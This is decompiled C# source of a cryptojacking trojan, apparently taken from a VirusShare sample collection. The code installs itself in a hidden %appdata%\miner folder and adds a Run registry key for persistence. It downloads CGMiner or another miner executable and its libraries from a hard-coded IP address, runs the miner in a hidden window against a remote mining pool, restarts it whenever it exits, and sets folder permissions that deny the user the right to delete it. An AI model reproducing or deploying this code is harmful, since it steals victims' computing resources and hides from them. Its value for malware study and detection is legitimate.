// Decompiled with JetBrains decompiler
// Type: Form3
// Assembly: stacyXXX2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9694384-E10F-4B43-9FEE-87C4694581F4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-b2f9edaa5f780f1b551badc30bd5511a7d9c1049c06af1da6ba00f8f4dace556.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
public sealed class Form3
{
  private static WebClient WebClient1 = new WebClient();
  private static Process MiningProcess = new Process();

  [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

  [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int MoveFile([MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName, [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName, long dwFlags);

  [STAThread]
  public static void Main()
  {
    string name = "goblmah371z";
    Mutex mutex;
    try
    {
      mutex = Mutex.OpenExisting(name);
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      mutex = new Mutex(true, name);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Interaction.Environ("appdata") + "\\miner"))
        Form3.LockAndHideFolder(Interaction.Environ("appdata") + "\\miner");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("", (object) (Interaction.Environ("appdata") + "\\miner\\stacyXXX2.exe"));
      if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\stacyXXX2.exe"))
      {
        string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
        string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
        int moduleFileName = Form3.GetModuleFileName(0, ref fileName2, 256);
        Form3.MoveFile(Strings.LSet(fileName1, moduleFileName), Interaction.Environ("appdata") + "\\miner\\stacyXXX2.exe", 8L);
      }
      string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      if (System.IO.File.Exists(path))
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\CGMiner.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/CGMiner.exe", Interaction.Environ("appdata") + "\\miner\\CGMiner.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\diablo130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/diablo130302.cl", Interaction.Environ("appdata") + "\\miner\\diablo130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\diakgcn121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/diakgcn121016.cl", Interaction.Environ("appdata") + "\\miner\\diakgcn121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\libeay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libeay32.dll", Interaction.Environ("appdata") + "\\miner\\libeay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\libidn-11.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libidn-11.dll", Interaction.Environ("appdata") + "\\miner\\libidn-11.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\libpdcurses.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libpdcurses.dll", Interaction.Environ("appdata") + "\\miner\\libpdcurses.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\phatk121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk121016.cl", Interaction.Environ("appdata") + "\\miner\\phatk121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\poclbm130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/poclbm130302.cl", Interaction.Environ("appdata") + "\\miner\\poclbm130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\libcurl.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libcurl.dll", Interaction.Environ("appdata") + "\\miner\\libcurl.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\pthreadGC2.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/pthreadGC2.dll", Interaction.Environ("appdata") + "\\miner\\pthreadGC2.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\scrypt130511.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/scrypt130511.cl", Interaction.Environ("appdata") + "\\miner\\scrypt130511.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\ssleay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/ssleay32.dll", Interaction.Environ("appdata") + "\\miner\\ssleay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\zlib1.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/zlib1.dll", Interaction.Environ("appdata") + "\\miner\\zlib1.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\miner\\CGMiner.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "--scrypt -o http://23.92.75.30:8332 -u Chronine.pool -p pool --auto-fan --auto-gpu --gpu-threads 0 --gpu-fan 0 --temp-target 0 --temp-overheat 10 --no-submit-stale";
      }
      else
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\explorer.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/coin-miner.exe", Interaction.Environ("appdata") + "\\miner\\explorer.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\bdb.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/bdb.dll", Interaction.Environ("appdata") + "\\miner\\bdb.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\btc.il"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/btc.il", Interaction.Environ("appdata") + "\\miner\\btc.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\btc-evergreen.il"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/btc-evergreen.il", Interaction.Environ("appdata") + "\\miner\\btc-evergreen.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\coinutil.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/coinutil.dll", Interaction.Environ("appdata") + "\\miner\\coinutil.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\miner.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/miner.dll", Interaction.Environ("appdata") + "\\miner\\miner.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\phatk.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk.cl", Interaction.Environ("appdata") + "\\miner\\phatk.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\phatk.ptx"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk.ptx", Interaction.Environ("appdata") + "\\miner\\phatk.ptx");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\miner\\usft_ext.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/usft_ext.dll", Interaction.Environ("appdata") + "\\miner\\usft_ext.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\miner\\explorer.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-a scrypt -g no -o http://23.92.75.30:8332 -u Chronine.pool -p pool -t 2";
      }
      Form3.MiningProcess.Start();
      Form3.MiningProcess.EnableRaisingEvents = true;
      Form3.MiningProcess.Exited += new EventHandler(Form3.MiningProcessClosed);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex);
      ProjectData.ClearProjectError();
    }
    while (true)
      Thread.Sleep(3009);
  }

  public static void MiningProcessClosed(object sender, EventArgs e) => Form3.MiningProcess.Start();

  public static bool LockAndHideFolder(string path)
  {
    string name = WindowsIdentity.GetCurrent().Name;
    FileSystemAccessRule rule1 = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
    FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    DirectorySecurity directorySecurity = new DirectorySecurity();
    directorySecurity.AddAccessRule(rule1);
    directorySecurity.AddAccessRule(rule3);
    directorySecurity.AddAccessRule(rule2);
    bool flag;
    try
    {
      Process process = new Process();
      Directory.CreateDirectory(path, directorySecurity);
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "CMD.exe",
        Arguments = "/C attrib -s -h " + Convert.ToString(path)
      };
      process.Start();
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }
}
